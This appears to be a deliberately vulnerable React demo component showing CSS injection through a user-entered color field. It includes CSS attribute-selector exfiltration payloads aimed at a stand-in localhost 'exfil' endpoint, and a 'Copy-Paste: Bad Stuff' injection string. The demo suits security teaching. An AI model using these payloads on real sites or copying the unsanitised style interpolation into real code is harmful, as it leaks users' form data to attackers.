import React, { useState } from 'react';
import styled from 'styled-components';

const InsecureProfile = () => {
    const [chosenColor, setChosenColor] = useState('');
    let userProfile = {
        id: '00023_sequential-int-shame',
        name: 'John Smith',
        handle: 'johnny',
        address: '123 Drury Ln.',
        city: 'Austin',
        state: 'TX',

        color: '#20B2AA'
    };  

    let approvedColors = [
        '#d7816a',
        '#bd4f6c',
        '#abe9cd',
    ];

    const Layout = styled.div`
        margin-top: 200px;  

        display: flex;
        flex-direction: row;
        justify-content: center;
        align-items: center;
    `;

    const exploit = "input[name=editUsername] [value^=j] { background-color: url(http://localhost:5000/exfil/get/j); }";
    const attackerApi = 'http://localhost:5000/exfil/get/j';

    const Profile = styled.div`
        padding-left: 50px;
    
        display: flex;
        flex-direction: column

        button {
            margin-top: 20px;
            background: ${props => props.background ? `url(${props.background})` : 'nope'};
        }
    `;
    // background: url(${attackerApi});

    const ProfileImage = styled.div`
        width: 100px;
        height: 100px;
        background: ${props => props.background ? props.background : 'none'}
        border-radius: 50%;
        display: flex;
        flex-direction: row;
        justify-content: center;
        align-items: center;
    `;
    // background: ${props => props.background ? props.background : 'none'};
    // background: ${props => props.background ? `url(${props.background})` : 'none'};
    // background-color: ${chosenColor}; ${exploit};

    const handleColorPreview = () => {
        console.log(chosenColor);
    }

    const handleColorChange = ({ target }) => {
        console.log(target.value);
        setChosenColor(target.value);
    }

    const saveChanges = () => {
        console.log('Save Changes clicked');
    }

    const handleTestInput = () => {
        console.log('test input changed');
    }

    return (
        <div>
            <h3>Insecure Profile</h3>

            <Layout>
                <ProfileImage background={chosenColor}>
                    <img src="https://img.icons8.com/ios/50/000000/user.png" />
                </ProfileImage>
                {/* <Profile background={attackerApi}>
                    <button>dummy button</button>
                </Profile> */}
            </Layout>

            <div style={{ display: `flex`, flexDirection: `row`, justifyContent: `center` }}>
                <div style={{ display: `flex`, flexDirection: `column` }}>
                <div>{userProfile.name}</div>
                <input name="editUsername" value="john smith" onChange={handleTestInput} />
                {/* <div>{userProfile.handle}</div> */}
                <div>Current color: {chosenColor}</div>
                <div>
                    <span>New color: </span>
                    <input 
                    name="colorInput"
                    placeholder="Enter new color..."
                    onChange={handleColorChange} 
                    value={chosenColor}
                    style={{ width: '500px' }} />
                    <button onClick={handleColorPreview}>Preview</button>
                </div>

                <button onClick={saveChanges}>Save Changes</button>
                </div>
            </div>

            <br />
            <hr />
            <p>Copy-Paste: Bad Stuff</p>
            <p>
                <code>#20B2AA;</code>
            </p>
            <p>
                <code>#20B2AA; background: url(https://localhost:5001/exfil/get/j);</code>
            </p>
            {/* <p>
                <code>{`input[value^="j"] { background: url(https://localhost:5001/exfil/get/j); }`}</code>
            </p> */}
        </div>
    );
};

export default InsecureProfile;